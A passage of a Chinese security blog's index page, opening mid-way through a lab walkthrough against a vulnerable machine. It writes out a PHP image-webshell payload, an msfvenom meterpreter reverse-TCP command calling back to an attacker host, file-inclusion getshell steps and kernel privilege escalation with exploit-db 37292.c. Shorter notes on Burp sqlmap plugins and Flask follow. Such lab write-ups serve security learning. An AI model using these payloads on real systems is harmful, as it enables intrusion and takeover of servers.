</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面只是对load参数进行一个过滤，替换其中的路径遍历符号<code>./</code>为空。</p>
+<p>上传图片马，下载jack的那个图片，末尾添加 <code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);?&gt;</code>,浏览器添加代理上传，</p>
+<p><img src="/.com//1563089387620.png" alt="1563089387620"></p>
+<p>添加continue字段，随意输入一个值，然后进行上传，返回值为success，知道上传成功，然后在phpmyadmin的上传表查找这个上传的路径。在users表中发现上传路径。</p>
+<p><img src="/.com//1563089639133.png" alt="1563089639133"></p>
+<p><img src="/.com//1563091267221.png" alt="1563091267221"></p>
+<p>查看图像链接路径为<code>http://192.168.188.140/uploaded_images/jack.jpg</code>，使用文件包含这个图片getshell，hackbar，post</p>
+<p><img src="/.com//1563090056138.png" alt="1563090056138"></p>
+<p>使用burp抓包发现图片马没有再本地生成shell.php，应该是图片马问题，然后在本地找gif的图片，使用</p>
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.188.139  LPORT=4444 R &gt; shell.php</code></p>
+<p>然后将其copy到windows上，在gif图片后面添加shell.php的内容，然后继续上传使用文件包含执行代码，</p>
+<p><img src="/.com//1563093836679.png" alt="1563093836679"></p>
+<p>成功弹回shell,</p>
+<p><img src="/.com//1563093892255.png" alt="1563093892255"></p>
+<h1 id="0x03-exp提权"><a href="#0x03-exp提权" class="headerlink" title="0x03 exp提权"></a>0x03 exp提权</h1><p>执行shell，切换到cmd_shell，然后使用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>弹回虚拟终端，</p>
+<p>执行<code>uname -a</code>,查看linux内核</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@indishell:/var/www$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux indishell 3.13.0-32-generic <span class="comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+<p>使用search_sploit查找内核版本提权漏洞，</p>
+<p><img src="/.com//1563095497266.png" alt="1563095497266"></p>
+<p>使用meterpreter上传exp文件，出错，发现此时是在var/www目录下，没有写入文件的权限，那么在uploaded_images存在写入文件的权限，在uploaded_images创建文件夹<code>mkdir hack</code>，然后使用切换到hack目录，使用<code>upload /usr/share/exploitdb/exploits/linux/local/37292.c</code>上传exp，修改文件权限</p>
+<p><img src="/.com//1563105602234.png" alt="1563105602234"></p>
+<p>然后输入<code>shell</code>进入交互shell中，然后编译 <code>gcc -o exp 37292.c</code>,</p>
+<p><img src="/.com//1563105720749.png" alt="1563105720749"></p>
+<p>执行exp</p>
+<p><img src="/.com//1563105809324.png" alt="1563105809324"></p>
+<p>成功提权。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/10/breach-ba-ji-shen-tou-ti-quan/">breach靶机渗透提权</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-10</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/10/burpsuit-chang-yong-cha-jian-bi-ji/">burpsuit常用插件笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-10</time><div class="content"><h1 id="burpsuit常用插件学习笔记"><a href="#burpsuit常用插件学习笔记" class="headerlink" title="burpsuit常用插件学习笔记"></a>burpsuit常用插件学习笔记</h1><h2 id="0x01-sqlipy"><a href="#0x01-sqlipy" class="headerlink" title="0x01 sqlipy"></a>0x01 sqlipy</h2><h3 id="sqlipy的安装"><a href="#sqlipy的安装" class="headerlink" title="sqlipy的安装"></a>sqlipy的安装</h3><p>由于sqlmap是Python语言编写的，而burp是java编写的所以需要先下载jython-standalone-2.7.0.jar文件，然后进行使用。jython是它是一个Python语言在Java中的完全实现。Jython不仅给你提供了Python的库，同时也提供了所有的Java类。</p>
+<blockquote>
+<p>jython-standalone-2.7.0.jar下载地址: <a href="http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar" target="_blank" rel="noopener">http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar</a></p>
+</blockquote>
+<p>我用的是burp2.0，下载完之后在Extender里面的options里面设置python和java的路径</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562401531038.png" alt="1562401531038"></p>
+<p>设置完路径在<img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562401557932.png" alt="1562401557932"></p>
+<p>安装后，我们对其进行一个使用。</p>
+<h3 id="sqlipy的使用"><a href="#sqlipy的使用" class="headerlink" title="sqlipy的使用"></a>sqlipy的使用</h3><p>首先我们打开sqlmapapi.py进行一个监听</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562402286150.png" alt="1562402286150"></p>
+<p>接下来我们对DVWA进行一个测试，打开sql注入的栏目，然后抓包，在右击鼠标将其使用sqlipy scan </p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562402550077.png" alt="1562402550077"></p>
+<p>然后设置sqlmap api的相关环境路径：</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562403474773.png" alt="1562403474773"></p>
+<p>切记路径不能使用中文。</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562404449423.png" alt="1562404449423"></p>
+<p>设置sqlmap的参数，然后点击start scan 然后在sqlmap的logs可以看到注入日志。</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562404503990.png" alt="1562404503990"></p>
+<hr>
+<h2 id="0x02-co2"><a href="#0x02-co2" class="headerlink" title="0x02  co2"></a>0x02  co2</h2><hr>
+<p>co2也是使用sqlmap配合burpsuit的插件，但是感觉界面的设置更友好，我们在商店安装后，然后抓包，发送到send sqlmapper,点击选项卡co2，进入sqlmap注入的配置界面，</p>
+<p><img src="/.com//Users\hackqin\AppData\Roaming\Typora\typora-user-images\1562405319297.png" alt="1562405319297"></p>
+<p>点击config，配置sqlmap的一个路径，然后下面options就可以进行一个sqlmap选项的配置，最后点击config上面的run，就可以看到一个命令行参数运行sqlmap，这个插件比上面的插件界面更加友好，可以配置的选项很多。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/10/xin-xi-shou-ji/">信息收集</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-10</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/10/flask-kuang-jia-xue-xi-bi-ji/">flask框架学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/学习笔记/">学习笔记</a></span><div class="content"><h1 id="0x01-flask简介"><a href="#0x01-flask简介" class="headerlink" title="0x01 flask简介"></a>0x01 flask简介</h1><p>flask有两个依赖，一个是WSGI(web服务器网关接口)工具集，一个是<strong>WSGI(web server werkzeug)</strong>，另一个是<strong>jinja2模板引擎</strong>，flask是一个可扩展的框架。</p>
+<p><strong>注解：WSGI(web server werkzeug)</strong>：是python用来规定web服务器如何与python web程序进行沟通的标准</p>
+<ol>
+<li><h5 id="简单的包管理工具介绍"><a href="#简单的包管理工具介绍" class="headerlink" title="简单的包管理工具介绍"></a>简单的包管理工具介绍</h5></li>
+</ol>
+<ul>
+<li>pipenv：解决pip和virtualenv+requirements的工作方式的弊端，windows下生成的虚拟环境在Administrator.virtualenvs\目录创建，linux在local\share\virtualenvs目录创建，在项目目录中创建虚拟环境文件，可以设置变量PIPENV_VENV_IN_PROJECT变量等于1.使用<code>pipenv shell</code>激活环境`</li>
+</ul>
+<h1 id="0x02-flask与http请求"><a href="#0x02-flask与http请求" class="headerlink" title="0x02 flask与http请求"></a>0x02 flask与http请求</h1><h2 id="1-注册路由"><a href="#1-注册路由" class="headerlink" title="1. 注册路由"></a>1. 注册路由</h2><ul>
+<li><strong>视图可以绑定多个URL</strong></li>
+<li><strong>动态URL</strong>  <ul>
+<li>app.route(“/greet/<name>“)` 如果url没有跟相应的路径就会出现404错误，可以在app.route中设置defaults字典</name></li>
+</ul>
+</li>
+</ul>
+<h2 id="2-flask-run启动内置的服务器"><a href="#2-flask-run启动内置的服务器" class="headerlink" title="2.flask run启动内置的服务器"></a>2.flask run启动内置的服务器</h2><p>需要设置flask_app环境变量指定实例所在的模块。默认寻找app或者application的py文件</p>
+<p>使用python-dotenv来进行环境变量的管理。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/01/mian-sha-si-lu-zong-jie/">免杀思路总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-01</time><div class="content"></div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By starjian</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
